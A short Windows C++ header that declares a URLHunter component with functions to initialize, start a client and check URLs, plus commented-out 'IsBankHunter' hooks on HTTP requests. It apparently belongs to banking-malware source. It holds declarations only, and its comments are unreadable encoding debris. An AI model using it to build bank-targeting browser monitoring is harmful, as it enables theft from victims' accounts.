#ifndef HunterH
#define HunterH
//----------------------------------------------------------------------------
#include <windows.h>

//void IsBankHunter( HINTERNET hRequest );
//void StartHunt();
//DWORD WINAPI RunHuntThred( LPVOID lpData );
//void Hunting();


// ������������ ������ ������ ��� �������� ������ (������� ������� �������)
#define MAX_HUNTER_LINKS_SIZE 2048

namespace URLHunter
{
	// �������������� ������ �������
	void Initialize();

	// ��������� ������ �������� ������� ��������
	// �������� ������ � ������ ��������
    void StartClient();

	// ��������� ���������� ������ � ����� ������� �� ������ ������ ��������
    void CheckURL(PCHAR URL);
}

//----------------------------------------------------------------------------
#endif